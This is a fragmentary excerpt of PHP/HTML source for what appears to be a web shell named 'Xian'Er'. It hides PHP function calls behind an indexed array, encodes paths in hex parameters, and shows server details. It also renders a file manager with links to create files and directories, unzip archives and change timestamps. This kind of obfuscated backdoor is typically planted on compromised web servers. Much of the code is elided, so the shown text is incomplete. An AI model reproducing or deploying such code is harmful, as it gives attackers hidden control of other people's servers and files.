	...
	<html dir="auto" lang="en-US">
		...
		<body>
			<header>
				<div class="y x">
					<br>
					<a class="ajx" href="<?php echo basename((string) $_SERVER['PHP_SELF']); ?>">
						Xian'Er
					</a>
				</div>
			...
			<article>
				<div class="i">
					...
					<i class="fa-regular fa-lightbulb"></i> &thinsp;&thinsp;<b>SOFT  :</b> <?php echo $_SERVER['SERVER_SOFTWARE']; ?> <b>PHP :</b> <?php echo $GNJ[1](); ?>
				...
				<div class="u">
					<?php echo $_SERVER['SERVER_ADDR']; ?> <i class="fa-solid fa-link"></i>
					<br />
					<br />
       ...
       if($("#b64 option:selected").val() == 0) {
        ...
        ' . $c_;
                        if (!empty($_POST['b'])) {
                            ...
                            //    $t += (int) $x[$i] * 8 ** (strlen((string) $x) - $i - 1);
                            for ($i = strlen((string) $x) - 1; $i >= 0; --$i) {
                                $t += (int) $x[$i] * 8 ** (strlen((string) $x) - $i - 1);
                            }
...
<thead>
    <tr>
      ...
      <tbody>
       <tr>
        <td>
         <a class="ajx color-a" href="?d=' . hex($d) . '&n">+FILE</a>
         <a class="ajx color-b" href="?d=' . hex($d) . '&l">+DIR</a>
        </td>
       </tr>
      ';
                        ...
                        if ($GNJ[28]($w) || $GNJ[29]($w)) {
                            foreach ($w as $c) {
                                $e = $GNJ[14]('\\', '/', $d);
                                $zi = $GNJ[30]($c, '.zip') ? '<a href="?d=' . hex($e) . '&z=' . hex($c) . '">U</a>' : '';
                                if ($GNJ[31](sprintf('%s/%s', $d, $c))) {
                                    $o = '';
                                } elseif (!$GNJ[32](sprintf('%s/%s', $d, $c))) {
                                    $o = ' h';
                                } else {
                                    $o = ' w';
                                }
                                $s = $GNJ[34](sprintf('%s/%s', $d, $c)) / 1024;
                                $s = round($s, 3);
                                $s = $s >= 1024 ? round($s / 1024, 2) . ' MB' : $s . ' KB';
                                if (($c != '.') && ($c != '..')) {
                                    ($GNJ[8](sprintf('%s/%s', $d, $c)))
                                        ? $h .= '<tr class="r">
       <td>
        <i class="fa-regular fa-folder m"></i>
       ...
       <td class="x">
        <a class="ajx' . $o . '" href="?d=' . hex($e) . '&k=' . hex($c) . '">' . x(sprintf('%s/%s', $d, $c)) . '</a>
       </td>
       <td class="x">
        <a class="ajx" href="?d=' . hex($e) . '&t=' . hex($c) . '">' . $GNJ[20]('Y-m-d H:i', $GNJ[21](sprintf('%s/%s', $d, $c))) . '</a>
       </td>
       <td class="x">
      ...
      '
                                        : $j .= '<tr class="r">
       <td>
        <i class="fa-regular fa-file m"></i>&thinsp;
...
{
    global $GNJ;
    if (trim(pathinfo((string) $j, PATHINFO_BASENAME), '.') === '') {
        return;
    }
    if ($GNJ[8]($j)) {
...
function uhex($y): string
{
    $n = '';
    for ($i = 0; $i < strlen((string) $y) - 1; $i += 2) {
...
function x($c): string
{
    ...
    $u .= ((($x & 0x100) !== 0) ? 'r' : '-');
    $u .= ((($x & 0x80) !== 0) ? 'w' : '-');
    $u .= ((($x & 0x40) !== 0) ? ((($x & 0x800) !== 0) ? 's' : 'x') : ((($x & 0x800) !== 0) ? 'S' : '-'));
    $u .= ((($x & 0x20) !== 0) ? 'r' : '-');
    $u .= ((($x & 0x10) !== 0) ? 'w' : '-');
    $u .= ((($x & 0x8) !== 0) ? ((($x & 0x400) !== 0) ? 's' : 'x') : ((($x & 0x400) !== 0) ? 'S' : '-'));
    $u .= ((($x & 0x4) !== 0) ? 'r' : '-');
    $u .= ((($x & 0x2) !== 0) ? 'w' : '-');
    $u .= ((($x & 0x1) !== 0) ? ((($x & 0x200) !== 0) ? 't' : 'x') : ((($x & 0x200) !== 0) ? 'T' : '-'));
    return $u;
}
